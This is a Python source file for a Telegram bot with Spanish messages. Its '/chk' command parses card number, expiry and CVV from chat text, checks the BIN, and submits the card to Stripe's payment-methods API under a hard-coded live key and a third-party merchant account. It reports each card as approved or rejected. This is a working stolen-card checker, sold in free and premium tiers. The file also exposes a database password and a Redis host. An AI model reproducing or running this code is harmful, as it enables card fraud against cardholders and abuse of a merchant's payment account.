import time
import random
import string
import re
import redis
import aiohttp
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from motor.motor_asyncio import AsyncIOMotorClient

# --- CONFIGURACIÓN NECESARIA --- #
mongo_client = AsyncIOMotorClient("mongodb+srv://root:1ikHUYGDhXqAq8Ox@cluster0.unejfbx.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
maindb = mongo_client["mills"]

antidb = redis.Redis(host="redis-17574.c10.us-east-1-4.ec2.redns.redis-cloud.com", port=17574, db=0)
banned_bins = "11111"
use_not_registered = "No estás registrado, por favor regístrate primero."
buy_premium = "Tu plan es Free. Compra Premium para usar este comando."
waste_cards = [0, 7, 8, 9]
# ------------------------------- #

@Client.on_message(filters.command(["ch", "chk"], prefixes=[".", "/", "!"]) & filters.text)
async def ch(client, message):
    started_time = time.time()
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("「ADMIN 1」", url="https://t.me/admin1username"),
            InlineKeyboardButton("「ADMIN 2」", url="https://t.me/admin2username")
        ],
        [
            InlineKeyboardButton("「OWNER」", url="https://t.me/gsmdiego")
        ]
    ])

    try:
        user = message.from_user
        if not user:
            await message.reply_text("No se pudo obtener información del usuario.", reply_to_message_id=message.id)
            return

        user_id = user.id
        nombre = user.first_name or "Usuario"

        if maindb is None:
            await message.reply_text("Base de datos no configurada.", reply_to_message_id=message.id)
            return

        find = await maindb["usuarios"].find_one({"_id": user_id})
        if not find:
            await message.reply_text(use_not_registered, reply_to_message_id=message.id)
            return

        rol = find.get("status", "")

        if rol == "F" and message.chat.type == 'private':
            await message.reply_text(buy_premium, reply_to_message_id=message.id)
            return

        if antidb is None:
            await message.reply_text("Sistema antispam no configurado.", reply_to_message_id=message.id)
            return

        antispam_time_bytes = antidb.get(str(user_id))
        antispam_time = int(antispam_time_bytes.decode("utf-8")) if antispam_time_bytes else 0
        spam_time = int(time.time()) - antispam_time

        if rol == "P" and spam_time < 10:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo en {10 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return
        elif rol == "F" and spam_time < 60:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo en {60 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return

        antidb.set(str(user_id), str(int(time.time())))

        init_text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
<b>【〄】</b> PROCESS: <b>□□□□□□□□□□ 0%</b>
<b>【〄】</b> CHECKING BY: <b><a href=\"tg://user?id={user_id}\">{nombre}</a> - {rol}</b>
<b>【〄】</b> TIME TAKING: {round(time.time() - started_time, 2)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
        msg = await message.reply_text(text=init_text, reply_to_message_id=message.id)
        client.send_chat_action(message.chat.id, "typing")

        text_to_check = message.reply_to_message.text if message.reply_to_message else message.text
        if not text_to_check:
            await msg.edit_text("No se encontró texto para chequear.", reply_markup=buttons)
            return

        input_data = re.findall(r"[0-9]+", text_to_check)
        if len(input_data) < 3:
            await msg.edit_text("No se encontraron datos válidos de tarjeta.", reply_markup=buttons)
            return

        if len(input_data) == 3:
            cc, mesano, cvv = input_data
            mes, ano = mesano[:2], mesano[2:]
        else:
            cc, mes, ano, cvv = input_data[:4]
            if len(mes) > 2:
                ano, cvv, mes = cvv, mes, ano

        if int(cc[0]) in waste_cards or len(cc) not in [15, 16]:
            await msg.edit_text("Tarjeta inválida.", reply_markup=buttons)
            return
        if len(mes) not in [2, 4] or (len(mes) == 2 and (mes > '12' or mes < '01')):
            await msg.edit_text("Mes inválido.", reply_markup=buttons)
            return
        if (len(ano) == 2 and (ano < '21' or ano > '29')) or (len(ano) == 4 and (ano < '2021' or ano > '2029')):
            await msg.edit_text("Año inválido.", reply_markup=buttons)
            return
        if (int(cc[0]) == 3 and len(cvv) != 4) or len(cvv) not in [3, 4]:
            await msg.edit_text("CVV inválido.", reply_markup=buttons)
            return

        bin_number = cc[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number}") as res:
                if res.status != 200:
                    await msg.edit_text("Fallo al consultar BIN.", reply_markup=buttons)
                    return
                bin_data_json = await res.json()

        if not bin_data_json or bin_number + "\n" in banned_bins:
            await msg.edit_text("BIN no válido o tarjeta baneada.", reply_markup=buttons)
            return

        email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '@gmail.com'
        sk_headers = {
            "Authorization": "Bearer pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = (
            f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}"
            "&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F583319551"
            "%3B+stripe-js-v3%2F583319551&time_on_page=69254"
            "&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX"
            "&_stripe_account=acct_16WRSqINWTSGTB2G"
        )

        async with aiohttp.ClientSession() as session:
            async with session.post("https://api.stripe.com/v1/payment_methods", headers=sk_headers, data=data) as res:
                json_first = await res.json()

        if 'error' in json_first:
            result_text = "RECHAZADO❌ [TARJETA INCORRECTA]"
        elif 'id' not in json_first:
            result_text = "RECHAZADO❌ [ERROR DESCONOCIDO]"
        else:
            result_text = "APROBADO✅ [TARJETA VÁLIDA]"

        result_msg = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
<b>【〄】</b> RESULT: <b>{result_text}</b>
<b>【〄】</b> CHECKING BY: <b><a href=\"tg://user?id={user_id}\">{nombre}</a> - {rol}</b>
<b>【〄】</b> TIME TAKING: {round(time.time() - started_time, 2)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
        await msg.edit_text(result_msg, reply_markup=buttons)

    except Exception as e:
        await message.reply_text(f"Error: {str(e)}", reply_to_message_id=message.id)
